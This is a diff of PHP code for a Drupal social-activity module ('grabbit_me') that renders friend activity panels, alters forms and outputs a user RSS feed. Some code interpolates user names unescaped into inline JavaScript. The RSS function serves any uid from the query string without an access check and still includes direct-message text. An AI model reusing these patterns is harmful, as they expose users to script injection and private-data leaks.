+	  drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); $('#content-area .title').html('".$friend->name." added Friends'); 
+	                 $('.content-truncated').truncate( 135,{
+					        trail: [ '...<a href=\'#\' class=\'truncate_show\'>more</a>', '<a href=\'#\' class=\'truncate_hide\'>less</a>' ]
+					});  })",'inline');
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+	  $output = theme_you_activity($friend->uid, $friend->name);
+	  $output .=grabbit_me_you_activity_friends($friend);
+	  return $output;
+	}else{
+		drupal_goto('users/'.$friend->name);
+	}
+}
+
+function grabbit_me_you_rss(){
+	global $user;
+	
+	$friend = user_load(arg(2));
+	
+	$status = friendlist_api_relation_status_calculate($user->uid, $friend->uid, 1);
+    if($status=='TW_BOTH' || user_access('administer users')){
+	  drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); $('#content-area .title').html('".$friend->name." RSS'); 
+	                 $('.content-truncated').truncate( 135,{
+					        trail: [ '...<a href=\'#\' class=\'truncate_show\'>more</a>', '<a href=\'#\' class=\'truncate_hide\'>less</a>' ]
+					});  })",'inline');
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+	  $output = theme_you_activity($friend->uid, $friend->name);
+	  $output .=grabbit_me_you_activity_rss($friend);
+	  return $output;
+	}else{
+		drupal_goto('users/'.$friend->name);
+	}
+}
+
+function grabbit_me_you_mentions(){
+	global $user;
+	
+	$friend = user_load(arg(2));
+	
+	$status = friendlist_api_relation_status_calculate($user->uid, $friend->uid, 1);
+    if($status=='TW_BOTH' || user_access('administer users')){
+	  drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); $('#content-area .title').html('".$friend->name." mentions'); 
+	                 $('.content-truncated').truncate( 135,{
+					        trail: [ '...<a href=\'#\' class=\'truncate_show\'>more</a>', '<a href=\'#\' class=\'truncate_hide\'>less</a>' ]
+					}); })",'inline');
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+	  $output = theme_you_activity($friend->uid, $friend->name);
+	  $output .=grabbit_me_you_activity_mentions($friend);
+	  return $output;
+	}else{
+		drupal_goto('users/'.$friend->name);
+	}
+}
+
+function grabbit_me_you_activity_rendered($user){
+	
+    // get statuses
+    $statuses = grabbit_me_get_statuses($user->uid);
+    $profile = content_profile_load('profile', $user->uid);
+    $nod='even';
+    if(!count($statuses)){
+	  $updates = '<div class="messages-status-updates">No status updates in grabbit yet</div>';
+    }else{
+	  	foreach($statuses as $status){
+		  $item=unserialize($status->extra);
+		  $item['faid']=$status->faid;
+	      $updates .= grabbit_me_theme_my_activity($nod,$item,$profile,$status);
+	      if($nod=='odd'){
+		    $nod='even';
+	      }else{
+		    $nod='odd';
+	      }
+	    }
+	
+    } 
+    // end statuses
+
+    
+			$output .='<div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Last Updates</h3>
+						  </div>
+						</div>';
+						
+			$more = '<div class="panel-controller"><a href="javascript:void(0)" class="main-stream-next" id="me-more" pid="2" uid="'.$user->uid.'" page="2">more</a></div>';
+			$output .=$updates.$more;
+
+  return $output;	
+}
+
+
+function grabbit_me_you_activity_comments($user){
+	
+	// get comments
+	$comm = grabbit_me_get_comments($user->uid,$limit=10);
+	if (!count($comm)){
+	  $comments = '<div class="messages-status-updates">No comments in grabbit yet</div>';
+	}else{
+	    $nod='even display';
+	  	foreach($comm as $comment){
+		  $item=unserialize($comment->extra);
+	      $comments .= grabbit_me_theme_my_activity_comments($nod,$item);
+	      if($nod=='odd display'){
+		    $nod='even display';
+	      }else{
+		    $nod='odd display';
+	      }
+	    } 
+	}
+	// end comments
+	
+			$output .='
+			           <div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Comments</h3>
+						  </div>
+						</div>';
+			$more = '<div class="panel-controller"><a href="javascript:void(0)" class="main-stream-next" id="me-more" pid="3" uid="'.$user->uid.'" page="2">more</a></div>';
+			$output .=$comments.$more;
+   return $output;
+	
+}
+
+function grabbit_me_you_activity_rss($user){
+	
+    $updates = grabbit_me_get_statuses_rss($user->uid);
+    
+			$output .='<div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Last Updates</h3>
+						  </div>
+						</div>';
+		//	$more = '<div class="panel-controller"><a href="javascript:void(0)" class="main-stream-next" id="me-more" pid="4" uid="'.$user->uid.'" page="2">more</a></div>';
+			$output .=$updates.$more;
+
+
+  return $output;	
+}
+
+function grabbit_me_you_activity_mentions($user){
+
+		// get mentions
+		$ment = grabbit_me_get_mentions($user->uid,$user->name);
+		if (!count($ment)){
+		  $mentions = '<div class="messages-status-updates">No mentions in grabbit yet</div>';
+		}else{
+		    $nod='even';
+		  	foreach($ment as $m_status){
+			  $item=unserialize($m_status->extra);
+              $profile = content_profile_load('profile', $m_status->uid);
+		      $mentions .= grabbit_me_theme_my_activity($nod,$item,$profile,$m_status);
+		      if($nod=='odd'){
+			    $nod='even';
+		      }else{
+			    $nod='odd';
+		      }
+		    } 
+		}
+		// end mentions
+
+			$output .='<div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Mentions</h3>
+						  </div>
+						</div>';
+			$output .=$mentions;
+
+   return $output;
+	
+}
+
+function grabbit_me_you_activity_friends($user){
+	
+    $updates = grabbit_me_get_statuses_friends($user->uid);
+    
+			$output .='<div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Last Updates</h3>
+						  </div>
+						</div>';
+			$output .=$updates;
+
+
+  return $output;	
+}
+
+
+function grabbit_me_form_alter(&$form, $form_state, $form_id){
+	if($form_id=='user_login'){
+		if(arg(0)=='user'){
+			$form['recover']=array(
+				'#type'=>'item',
+				'#value'=>'Forgot your password? &raquo; '.l('recover','user/password'),
+				'#weight'=>-1,
+				'#prefix'=>'<span class="forgot-password">',
+				'#suffix'=>'</span>'
+				);
+		}
+	}
+	if($form_id=='user_register'){
+		$form['submit']['#prefix']='<div id="registering">By registering I understand and accept the Grabbit '.l('Terms of Service','terms-service', array('attributes'=>array('target'=>'blank'))).'</div>';
+	}
+	if($form_id=='feedapi_import_opml'){
+	
+		$form['opml-des']=array(
+			'#type'=>'item',
+			'#value'=>'Later, if you decide to delete any of the feeds in your OPML file from Grabbit, you can do so individually by going to "settings > My feeds."',
+			'#weight'=>100,
+			);
+	}
+}
+
+function grabbit_me_rss_formating(){
+	global $base_url;
+	$uid = $_GET['uid'];
+	$limit = 10;
+	$super_array=array();
+
+	  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='status' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+	  while ($status = db_fetch_object($result)){
+		$super_array[$status->number]=$status;
+		$super_array[$status->number]->type='status';
+	  }
+
+	  $result = db_query("SELECT * FROM {friendlist_statuses} WHERE requester_id=%d AND status='TW_BOTH' ORDER BY last_update_time DESC LIMIT %s",$uid,$limit);
+
+	  while ($status = db_fetch_object($result)){
+		$super_array[$status->last_update_time]=$status;
+		$super_array[$status->last_update_time]->type='friend';
+	  }
+
+	  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='comment' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+	  while ($status = db_fetch_object($result)){
+		$super_array[$status->number]=$status;
+		$super_array[$status->number]->type='comment';
+	  }
+
+	  $result = db_query("SELECT * FROM {grabbit_me} WHERE uid=%d AND type='rss' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+	  while ($status = db_fetch_object($result)){
+		$super_array[$status->number]=$status;
+		$super_array[$status->number]->type='rss';
+	  }
+
+	  $result = db_query("SELECT * FROM {node} WHERE uid=%d AND type='feed' ORDER BY created DESC LIMIT %s",$uid,$limit);
+
+	  while ($status = db_fetch_object($result)){
+		$super_array[$status->created]=$status;
+	  }
+	  ksort($super_array);
+	  $reverse = array_reverse($super_array);
+	  $total = array_slice($reverse,0,15);
+      $user = user_load($uid);
+	  $profile = content_profile_load('profile', $uid);
+
+	  foreach($total as $element){
+
+	    switch($element->type){
+		  case 'comment':
+			  $item=unserialize($element->extra);
+		      $node=node_load($item['nid'],NULL,TRUE);
+              switch($node->type){
+				case 'facebook':
+		           $link = 'http://www.google.com';		 
+				break;
+				case 'twitter':
+				   $link = 'http://www.google.com';
+				break;
+				case 'gmail':
+				   $link = 'http://www.google.com';
+				break;
+				case 'imap':
+				   $link = 'http://www.google.com';
+				break;
+				case 'media':
+				   $link = 'http://www.google.com';
+				break;
+				default:
+				   $link = 'http://www.google.com';
+				break;
+			}
+		
+		      $title = 'Comment on '.$node->type.' item by '.$profile->title.' - '.format_date($node->created);
+		      //$description = 'Testing the description of the RSS feeds for the users';
+		     $description = ' ';
+		     $link = $base_url.'/users/'.$user->name;
+		  break;
+		  case 'status':
+		      $item=unserialize($element->extra);
+		      if(substr($item['status'], 0, 2) != 'D '){ //NO DIRECT MESSAGES
+			    $item['faid']=$element->faid;
+			    //$output .= grabbit_me_theme_my_activity($nod,$item,$profile,$element); 
+		      }
+		      $title = 'Status update by '.$profile->title. ' - '.format_date($item['time']);
+		      $description = $item['status'];
+		      $link = $base_url.'/users/'.$user->name;
+		  break;
+		  case 'rss':
+		      $item=unserialize($element->extra);
+		      $node=node_load($item['rss']);
+		      $node->created=$item['time'];
+		      $node->action=$item['action'];
+		      //$output .= grabbit_me_theme_feeds($nod,$node);
+		      $title = 'RSS '.$node->title.' added by '.$profile->title.' - '.format_date($node->created);
+		      $link = $base_url.'/node/'.$node->nid;
+		      $description = $node->body;
+		  break;
+		  case 'feed':
+		      $node=node_load($element->nid);
+		      //$output .= grabbit_me_theme_feeds($nod,$node);
+		      $title = 'RSS '.$node->title.' added by '.$profile->title.' - '.format_date($node->created);
+		      $link = $base_url.'/node/'.$node->nid;
+		      $description = $node->body;
+		  break;
+		  case 'friend':
+		      $user_1=user_load($element->requestee_id);
+		      $profile_user = content_profile_load('profile', $element->requestee_id);
+		      //$output .= grabbit_me_theme_friends($nod,$user,$profile_user,$element);
+		      $title = 'Friend '.$user_1.' added by '.$profile->name.' - '.format_date($element->last_update_time);
+		      $link = $base_url.'/users/'.$user_1->name;
+		      $description = ' ';
+		  break;
+	    }
+
+	    $output .= format_rss_item($title, $link, $description, $args = array());	 
+	  }
+	$title = "Activity channel for user ".$user->name." in Grabbit";
+	$link = $base_url. "/activity/rss?uid=".$uid;
+	$description = "This is the channel for the user activity in Grabbit. Subscribe and you'll get updates as soon as they happen.";
+    $namespaces = array('xmlns:dc="http://purl.org/dc/elements/1.1/"');
+    $format = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n";
+	$format .= "<rss version=\"2.0\" xml:base=\"". $base_url ."\" ". implode(' ', $namespaces) .">\n";
+	$format .= format_rss_channel($title, $link, $description, $output, $langcode  = NULL, $args = array());
+	$format .= "</rss>\n";
+
+	drupal_set_header('Content-Type: text/xml; charset=utf-8');
+	print $format;
+	exit;
+}
